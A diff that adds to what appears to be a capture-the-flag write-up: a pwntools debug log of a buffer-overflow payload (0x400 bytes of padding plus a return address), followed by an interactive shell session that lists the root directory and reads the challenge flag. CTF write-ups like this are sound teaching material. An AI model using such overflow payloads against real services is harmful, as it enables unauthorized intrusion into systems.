@@ -387,3 +387,69 @@ p.interactive()
 ```
 
 we get a shell and we just `cat flag.txt` to get the flag.
+
+```bash
+[DEBUG] Sent 0x411 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000400  41 41 41 41  41 41 41 41  48 17 40 00  00 00 00 00  │AAAA│AAAA│H·@·│····│
+    00000410  0a                                                  │·│
+    00000411
+[*] Switching to interactive mode
+[DEBUG] Received 0xe bytes:
+    b'Create note\n'
+    b'> '
+Create note
+> $ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x63 bytes:
+    b'bin\n'
+    b'boot\n'
+    b'dev\n'
+    b'etc\n'
+    b'flag.txt\n'
+    b'home\n'
+    b'lib\n'
+    b'lib64\n'
+    b'media\n'
+    b'mnt\n'
+    b'opt\n'
+    b'proc\n'
+    b'root\n'
+    b'run\n'
+    b'sbin\n'
+    b'srv\n'
+    b'sys\n'
+    b'test\n'
+    b'tmp\n'
+    b'usr\n'
+    b'var\n'
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+test
+tmp
+usr
+var
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x15 bytes:
+    b'DEAD{so_ez_pwn_hehe}\n'
+DEAD{so_ez_pwn_hehe}
+```
